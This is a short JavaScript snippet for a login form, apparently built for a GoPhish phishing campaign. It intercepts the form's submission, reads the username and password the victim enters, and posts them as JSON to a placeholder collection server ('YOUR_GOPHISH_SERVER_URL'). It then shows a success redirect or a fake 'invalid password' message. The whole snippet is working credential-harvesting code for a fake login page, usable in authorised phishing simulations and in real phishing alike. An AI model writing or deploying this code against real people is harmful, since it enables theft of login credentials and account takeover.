document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    // Gather form data
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Send data to the GoPhish server
    fetch('YOUR_GOPHISH_SERVER_URL', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            password: password
        }),
    })
    .then(response => response.json())
    .then(data => {
        // Handle response
        if (data.success) {
            window.location.href = 'success.html';
        } else {
            document.getElementById('errorMessage').textContent = 'Invalid username or password.';
        }
    })
    .catch((error) => {
        console.error('Error:', error);
        document.getElementById('errorMessage').textContent = 'An error occurred. Please try again.';
    });
});
